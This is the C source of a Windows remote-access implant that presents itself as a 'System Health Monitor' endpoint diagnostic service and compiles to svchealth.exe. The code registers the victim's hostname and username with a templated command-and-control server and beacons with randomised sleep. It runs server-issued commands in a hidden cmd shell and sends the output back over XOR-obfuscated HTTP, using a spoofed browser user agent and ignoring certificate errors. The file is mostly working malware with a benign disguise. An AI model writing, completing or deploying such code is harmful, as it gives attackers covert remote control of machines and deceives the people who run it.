/*
 * Windows System Health Monitor — Endpoint diagnostic service
 * Lightweight C implementation with minimal footprint (~50KB compiled)
 *
 * Build: x86_64-w64-mingw32-gcc -o svchealth.exe agent.c -lwinhttp -s -Os
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "winhttp")

/* Build-time configuration — replaced by generator */
#define C2_HOST L"{{C2_HOST}}"
#define C2_PORT {{C2_PORT}}
#define C2_PATH_REGISTER L"{{REGISTER_URI}}"
#define C2_PATH_CHECKIN L"{{CHECKIN_URI}}"
#define C2_PATH_RESULT L"{{RESULT_URI}}"
#define ENC_KEY "{{ENCRYPTION_KEY}}"
#define BEACON_SLEEP {{BEACON_INTERVAL}}
#define BEACON_JITTER {{BEACON_JITTER}}
#define USE_HTTPS {{USE_HTTPS}}

static char g_agent_id[16] = {0};

/* Simple XOR encrypt/decrypt with base64 */
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char* base64_encode(const unsigned char *data, size_t len, size_t *out_len) {
    size_t olen = 4 * ((len + 2) / 3);
    char *out = (char*)malloc(olen + 1);
    if (!out) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < len; i += 3, j += 4) {
        unsigned int v = data[i] << 16;
        if (i + 1 < len) v |= data[i+1] << 8;
        if (i + 2 < len) v |= data[i+2];
        out[j] = b64_table[(v >> 18) & 0x3F];
        out[j+1] = b64_table[(v >> 12) & 0x3F];
        out[j+2] = (i + 1 < len) ? b64_table[(v >> 6) & 0x3F] : '=';
        out[j+3] = (i + 2 < len) ? b64_table[v & 0x3F] : '=';
    }
    out[olen] = '\0';
    if (out_len) *out_len = olen;
    return out;
}

static unsigned char* base64_decode(const char *data, size_t len, size_t *out_len) {
    unsigned char dtable[256] = {0};
    for (int i = 0; i < 64; i++) dtable[(unsigned char)b64_table[i]] = i;
    size_t olen = len / 4 * 3;
    unsigned char *out = (unsigned char*)malloc(olen);
    if (!out) return NULL;
    size_t i, j;
    for (i = 0, j = 0; i < len; i += 4, j += 3) {
        unsigned int v = (dtable[(unsigned char)data[i]] << 18) |
                         (dtable[(unsigned char)data[i+1]] << 12) |
                         (dtable[(unsigned char)data[i+2]] << 6) |
                          dtable[(unsigned char)data[i+3]];
        out[j] = (v >> 16) & 0xFF;
        if (data[i+2] != '=') out[j+1] = (v >> 8) & 0xFF;
        if (data[i+3] != '=') out[j+2] = v & 0xFF;
    }
    if (data[len-1] == '=') olen--;
    if (data[len-2] == '=') olen--;
    if (out_len) *out_len = olen;
    return out;
}

static char* xor_encrypt(const char *data, size_t len) {
    const char *key = ENC_KEY;
    size_t klen = strlen(key);
    unsigned char *enc = (unsigned char*)malloc(len);
    for (size_t i = 0; i < len; i++)
        enc[i] = data[i] ^ key[i % klen];
    size_t b64len;
    char *result = base64_encode(enc, len, &b64len);
    free(enc);
    return result;
}

static char* xor_decrypt(const char *b64data) {
    size_t rawlen;
    unsigned char *raw = base64_decode(b64data, strlen(b64data), &rawlen);
    if (!raw) return NULL;
    const char *key = ENC_KEY;
    size_t klen = strlen(key);
    char *dec = (char*)malloc(rawlen + 1);
    for (size_t i = 0; i < rawlen; i++)
        dec[i] = raw[i] ^ key[i % klen];
    dec[rawlen] = '\0';
    free(raw);
    return dec;
}

static char* http_post(const wchar_t *path, const char *data) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                      WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return NULL; }

    DWORD flags = USE_HTTPS ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
                                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return NULL; }

    if (USE_HTTPS) {
        DWORD opt = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &opt, sizeof(opt));
    }

    WinHttpAddRequestHeaders(hRequest,
        L"Content-Type: application/x-www-form-urlencoded\r\n"
        L"Accept: text/html,*/*\r\n",
        -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    (LPVOID)data, strlen(data), strlen(data), 0);
    if (!sent || !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return NULL;
    }

    /* Read response */
    char *response = NULL;
    size_t total = 0;
    DWORD bytesRead;
    char buf[4096];
    while (WinHttpReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
        response = (char*)realloc(response, total + bytesRead + 1);
        memcpy(response + total, buf, bytesRead);
        total += bytesRead;
    }
    if (response) response[total] = '\0';

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return response;
}

static char* execute_command(const char *cmd) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    CreatePipe(&hRead, &hWrite, &sa, 0);
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    PROCESS_INFORMATION pi;

    char cmdline[2048];
    snprintf(cmdline, sizeof(cmdline), "cmd /c %s", cmd);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return _strdup("Error: CreateProcess failed");
    }
    CloseHandle(hWrite);

    char *output = NULL;
    size_t total = 0;
    DWORD bytesRead;
    char buf[4096];
    while (ReadFile(hRead, buf, sizeof(buf)-1, &bytesRead, NULL) && bytesRead > 0) {
        output = (char*)realloc(output, total + bytesRead + 1);
        memcpy(output + total, buf, bytesRead);
        total += bytesRead;
    }
    if (output) output[total] = '\0';
    else output = _strdup("Command executed (no output)");

    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
    return output;
}

static int do_register(void) {
    char hostname[256], username[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    size = sizeof(username);
    GetUserNameA(username, &size);

    char json[1024];
    snprintf(json, sizeof(json),
        "{\"type\":\"register\",\"metadata\":{\"hostname\":\"%s\",\"username\":\"%s\","
        "\"os\":\"Windows\",\"mode\":\"beacon\",\"beacon_interval\":%d}}",
        hostname, username, BEACON_SLEEP);

    char *enc = xor_encrypt(json, strlen(json));
    if (!enc) return 0;

    char *resp = http_post(C2_PATH_REGISTER, enc);
    free(enc);
    if (!resp) return 0;

    char *dec = xor_decrypt(resp);
    free(resp);
    if (!dec) return 0;

    /* Parse agent_id from response */
    char *id_start = strstr(dec, "\"agent_id\":\"");
    if (id_start) {
        id_start += 12;
        char *id_end = strchr(id_start, '"');
        if (id_end && (id_end - id_start) < sizeof(g_agent_id)) {
            memcpy(g_agent_id, id_start, id_end - id_start);
            g_agent_id[id_end - id_start] = '\0';
        }
    }
    free(dec);
    return g_agent_id[0] != '\0';
}

static void beacon_loop(void) {
    while (1) {
        /* Checkin */
        char json[1024];
        snprintf(json, sizeof(json),
            "{\"type\":\"checkin\",\"agent_id\":\"%s\",\"metadata\":{\"mode\":\"beacon\"},\"results\":[]}",
            g_agent_id);

        char *enc = xor_encrypt(json, strlen(json));
        char *resp = http_post(C2_PATH_CHECKIN, enc);
        free(enc);

        if (resp) {
            char *dec = xor_decrypt(resp);
            free(resp);
            if (dec) {
                /* Check for commands */
                char *cmd_start = strstr(dec, "\"command\":\"");
                while (cmd_start) {
                    cmd_start += 11;
                    char *cmd_end = strchr(cmd_start, '"');
                    if (!cmd_end) break;

                    char command[1024] = {0};
                    size_t cmdlen = cmd_end - cmd_start;
                    if (cmdlen >= sizeof(command)) cmdlen = sizeof(command) - 1;
                    memcpy(command, cmd_start, cmdlen);

                    if (strcmp(command, "__kill") == 0) {
                        free(dec);
                        ExitProcess(0);
                    }

                    /* Execute and send result */
                    char *output = execute_command(command);

                    char *result_json = (char*)malloc(strlen(output) + 512);
                    snprintf(result_json, strlen(output) + 512,
                        "{\"type\":\"response\",\"agent_id\":\"%s\",\"output\":\"%s\",\"command\":\"%s\"}",
                        g_agent_id, output, command);

                    char *enc_result = xor_encrypt(result_json, strlen(result_json));
                    char *ack = http_post(C2_PATH_RESULT, enc_result);
                    if (ack) free(ack);
                    free(enc_result);
                    free(result_json);
                    free(output);

                    cmd_start = strstr(cmd_end, "\"command\":\"");
                }
                free(dec);
            }
        }

        /* Sleep with jitter */
        int sleep_ms = BEACON_SLEEP * 1000;
        if (BEACON_JITTER > 0) {
            int jitter = (sleep_ms * BEACON_JITTER) / 100;
            sleep_ms = sleep_ms - jitter + (rand() % (jitter * 2));
        }
        Sleep(sleep_ms);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    /* Register with C2 */
    int retries = 0;
    while (!do_register() && retries < 10) {
        Sleep(5000);
        retries++;
    }
    if (g_agent_id[0] == '\0') return 1;

    /* Main beacon loop */
    beacon_loop();
    return 0;
}
